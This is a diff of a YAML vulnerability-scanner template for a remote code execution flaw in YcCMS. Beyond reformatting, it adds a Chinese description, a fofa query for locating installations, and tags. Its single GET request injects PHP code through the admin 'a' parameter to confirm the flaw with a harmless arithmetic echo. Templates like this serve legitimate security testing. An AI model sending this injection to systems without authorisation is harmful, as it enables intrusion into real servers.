@@ -1,17 +1,23 @@
 id: yccms-rce
 
 info:
-    name: YcCMS RCE
-    author: j4ckzh0u(https://github.com/j4ckzh0u),violin
-    severity: high
+  name: YcCMS RCE
+  author: j4ckzh0u,violin
+  severity: high
+  verified: false
+  description: |
+    YcCMS 存在远程命令执行漏洞，攻击者可以通过构造特殊的请求参数，在服务器上执行任意命令。
+    fofa: app="YcCMS"
+  tags: yccms,rce
+  created: 2025/03/13
 
 set:
-    r: randomInt(800000000, 1000000000)
-    r1: randomInt(800000000, 1000000000)
+  r: randomInt(800000000, 1000000000)
+  r1: randomInt(800000000, 1000000000)
 rules:
-    r0:
-        request:
-            method: GET
-            path: /admin/?a=Factory();print({{r}}%2b{{r1}});//../
-        expression: response.body.bcontains(bytes(string(r + r1)))
+  r0:
+    request:
+      method: GET
+      path: /admin/?a=Factory();print({{r}}%2b{{r1}});//../
+    expression: response.body.bcontains(bytes(string(r + r1)))
 expression: r0()
